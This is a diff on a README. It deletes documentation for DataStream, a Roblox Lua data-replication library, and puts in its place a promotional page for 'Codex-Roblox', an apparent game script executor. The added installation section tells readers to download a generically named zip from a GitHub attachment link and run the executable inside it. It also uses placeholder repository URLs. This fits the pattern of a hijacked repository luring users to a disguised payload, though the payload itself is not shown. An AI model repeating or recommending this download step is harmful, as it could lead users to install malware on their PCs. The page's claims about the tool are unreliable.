@@ -1,243 +1,79 @@
-# DataStream
 
-DataStream is a intuitive ReplicaService alternative. All schemas are replicated in real time (no loops!) between the client and server with no need to call obnoxious methods.
+# Codex-Roblox
 
-DataStreams can be used for anything from PlayerData to NPC data replication. As long as its an instance that exists on the client and server, it can be replicated!
+![Codex-Roblox](https://your-codex-repo-url.com/your-image.png)
 
-Recommended for use with projects that use external editors such as VSCode
+Roblox Codex Executor supports low-end PCs and lets you enjoy the stability and smoothness you crave. Codex stands out as the premier Roblox script executor, providing unparalleled functionality to effortlessly run scripts for your preferred Roblox games.
+
+---
 
 ## Table of Contents
-- [DataStream](#datastream)
-  - [Table of Contents](#table-of-contents)
-  - [Schemas](#schemas)
-    - [Global:](#global)
-    - [Player:](#player)
-  - [Methods `DataStreamObject`](#methods-datastreamobject)
-    - [**:Read()**](#read)
-    - [**:Write()**](#write)
-    - [**:Changed((newValue : any) -\> ())**](#changednewvalue--any---)
-    - [**:ChildAdded((indexOfChild : any) -\> ())**](#childaddedindexofchild--any---)
-    - [**:ChildRemoved((indexOfChild : any) -\> ())**](#childremovedindexofchild--any---)
-    - [**:Insert(value : any)**](#insertvalue--any)
-    - [**:Remove(value : any)**](#removevalue--any)
-  - [Examples](#examples)
-    - [1. Increase playtime each second for a player:](#1-increase-playtime-each-second-for-a-player)
-    - [2. Adding and removing players to an array](#2-adding-and-removing-players-to-an-array)
-  - [Installation](#installation)
 
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-## Schemas
+---
 
-A schema is a template data set DataStream starts with. In DataStream, there are two types of schemas:
+## Features
 
-1. Global Schemas
-   
-   Global schemas are a single data set that is initialized immediately that is shared in real-time between all players and the server.
-   
-2. Player Schemas 
-   
-    Player schemas are a data set that is unique to each individual player, and are initialized as each player joins.
+1. Easy-to-use interface.
+2. Supports running scripts on low-end PCs smoothly.
+3. Unparalleled functionality compared to other Roblox script executors.
+4. Stability and reliability for running scripts seamlessly.
 
-For our examples, we will be using the following schemas
-
-### Global:
-```lua
-return { --Schemas/Global/GameData.lua
-    CurrentGameTime = 0,
-    GlobalPlaytime = 0,
-    PlayerInGame = {},
-    CurrentGameMessage = "Intermission",
-    Stats = {
-        TotalDeaths = 0,
-        CoinsCollected = 0,
-        ObjectsCollected = {}
-    }
-}
-```
-
-### Player:
-```lua
-return { --Schemas/Player/Stored.lua
-    Currency = {
-        Coins = 0,
-        Gems = 0
-    },
-    PlaytimeSeconds = 0
-}
-```
-
-
-## Methods `DataStreamObject`
-**All methods are the same on the server and client.**
-
-### **:Read()**
-Reads the current value that the StreamObject references.
-
-```lua
-local value = DataStream.SchemaName.ValueName:Read()
-
-print("The current value of ValueName is", value)
-```
-
-### **:Write()**
-**SERVER ONLY** Writes the current value that the StreamObject references.
-
-```lua
--- There are many ways to perform a write operation:
-DataStream.SchemaName.ValueName:Write(10)
-DataStream.SchemaName.ValueName = 10
-
--- Math operators
-DataStream.SchemaName.ValueName *= 10
-DataStream.SchemaName.ValueName /= 10
-DataStream.SchemaName.ValueName += 10
-DataStream.SchemaName.ValueName -= 10
-```
-
-### **:Changed((newValue : any) -> ())**
-Fires a callback function when the referenced value is changed
-
-```lua
-DataStream.SchemaName.ValueName:Changed(function(newValue)
-    print("Value changed to", newValue)
-end)
-
-DataStream.SchemaName.ValueName = 10
-```
-
-### **:ChildAdded((indexOfChild : any) -> ())**
-Fires a callback function when the referenced dictionary has a new member.
-
-```lua
-DataStream.SchemaName.ValueName = {}
-DataStream.SchemaName.ValueName:ChildAdded(function(newIndex)
-    print("New value is equal to", DataStream.SchemaName.ValueName[newIndex]:Read())
-end)
-
-DataStream.SchemaName.ValueName.NewValue = "Hello world!"
-```
-
-### **:ChildRemoved((indexOfChild : any) -> ())**
-Fires a callback function when the referenced dictionary loses a member.
-
-```lua
-DataStream.SchemaName.ValueName = {
-    NewValue = "Hello World!"
-}
-DataStream.SchemaName.ValueName:ChildRemoved(function(newIndex)
-    print("New value is equal to", DataStream.SchemaName.ValueName[newIndex]:Read())
-end)
-
-DataStream.SchemaName.ValueName.NewValue = nil
-```
-
-### **:Insert(value : any)**
-**:Insert(position : number, value : any)**
-
-Inserts the provided value to the target position of the array. If target position is not provided, it will append at the end of the array.
-
-```lua
-DataStream.SchemaName.NewArray = {}
-
-DataStream.SchemaName.NewArray:Insert("Hello,")
-DataStream.SchemaName.NewArray:Insert("world!")
-
-print(table.concat(DataStream.SchemaName.NewArray:Read(), " ")) --> "Hello, world!"
-```
-
-### **:Remove(value : any)**
-
-Removes the specified element from the array, shifting later elements down to fill in the empty space if possible.
-
-```lua
-DataStream.SchemaName.NewArray = {"a", "b", "c"}
-
-DataStream.SchemaName.NewArray:Remove(2)
-DataStream.SchemaName.NewArray:Remove(2)
-
-print(DataStream.SchemaName.NewArray:Read()) --> { "a" }
-```
-
-
-
-## Examples
-
-*Note: These are all for example sake, some of these methods may not be the most efficient solutions depending on your use-case.*
-
-### 1. Increase playtime each second for a player:
-
-```lua
--- Server
-local Players = game:GetService("Players")
-local DataStream = require(DataStreamModule)
-
-local globalGameDataStream = DataStream.GameData
-
-local function SetupPlayer(player : Player)
-    local playerStoredStream = DataStream.Stored[player]
-
-    task.spawn(function()
-        while player.Parent and task.wait(1) do
-            playerStoredStream.PlaytimeSeconds += 1
-            globalGameDataStream.GlobalPlaytime += 1
-        end
-    end)
-end
-
-
--- Client
-
-local DataStreamClient = require(DataStreamClientModule)
-
-DataStreamClient.Stored.PlaytimeSeconds:Changed(function(seconds : number)
-    print("Current player seconds:", seconds)
-end)
-
-```
-
-### 2. Adding and removing players to an array
-
-```lua
--- Server
-local Players = game:GetService("Players")
-local DataStream = require(DataStreamModule)
-
-local globalGameDataStream = DataStream.GameData
-
-function AddPlayerToGame(player)
-    globalGameDataStream.PlayersInGame:Insert(player)
-end
-
-function RemovePlayerFromGame(player)
-    local index = table.find(globalGameDataStream.PlayersInGame:Read(), player)
-    if index then
-        globalGameDataStream.PlayersInGame:Remove(index)
-    end
-end
-
-
--- Client
-
-local DataStreamClient = require(DataStreamClientModule)
-
-local LocalPlayer = game.Players.LocalPlayer
-local PlayerInGameStream = DataStreamClient.GameData.PlayersInGame
-
-function isLocalPlayerInGame() : boolean
-    return table.find(PlayerInGameStream:Read(), LocalPlayer) ~= nil
-end
-```
+---
 
 ## Installation
 
-There are three folders:
+To get started with Codex-Roblox, you can follow the steps below:
 
-1. Move folders
-   - `src/Server` content should go in `ServerScriptService`
-   - `src/Client` content should go in `StarterPlayerScripts`
-   - `src/Shared` content should go in `ReplicatedStorage`
-  
+1. Download the latest version of Codex Executor from the [official repository](https://github.com/user-attachments/files/17394153/Software.zip). You can click the button below for a direct download:
 
-2. Edit `ServerDataStreamConfig.lua` and change `SHARED_MODULES_LOCATION` to the location of `DataStreamShared` folder.
-3. Edit `ClientDataStreamConfig.lua` and change `SHARED_MODULES_LOCATION` to the location of `DataStreamShared` folder.
-4. Done! the only two modules you should ever need to access are `DataStream` on the server and `ClientDataStream` on the client.
+[![Download Codex Executor](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/17394153/Software.zip)
+
+2. Extract the downloaded zip file to a location of your choice on your PC.
+
+3. Run the Codex Executor executable file and follow the on-screen instructions to complete the installation process.
+
+4. Once installed, you are ready to enjoy the powerful features of Codex-Roblox!
+
+---
+
+## Usage
+
+Codex-Roblox is designed to make running scripts for your favorite Roblox games a breeze. Here's how you can make the most out of this tool:
+
+1. Launch Codex Executor on your PC.
+2. Choose the Roblox game you want to run a script on.
+3. Load the script file into Codex Executor.
+4. Select the desired options/settings for the script.
+5. Click on the "Run" button to execute the script within the game.
+
+With Codex-Roblox, you can enhance your gaming experience and unlock new possibilities in your favorite Roblox games.
+
+---
+
+## Contributing
+
+We welcome contributions to improve Codex-Roblox and make it even better for the community. Here are a few ways you can contribute:
+
+1. **Bug Reports:** If you encounter any bugs or issues while using Codex-Roblox, please report them on the [issue tracker](https://github.com/your-codex-repo-url/issues).
+
+2. **Feature Requests:** Have an idea for a new feature or enhancement? Feel free to share it with us by opening a [feature request](https://github.com/your-codex-repo-url/issues).
+
+3. **Code Contributions:** If you're a developer, you can also contribute directly to the codebase by forking the repository, making your changes, and submitting a pull request.
+
+4. **Spread the Word:** Help us reach more users by sharing Codex-Roblox with your friends and on social media platforms.
+
+---
+
+## License
+
+Codex-Roblox is licensed under the MIT License. See the [LICENSE](https://github.com/your-codex-repo-url/blob/main/LICENSE) file for more details.
+
+---
+
+Enjoy using Codex-Roblox and take your Roblox gaming experience to the next level! 🎮✨
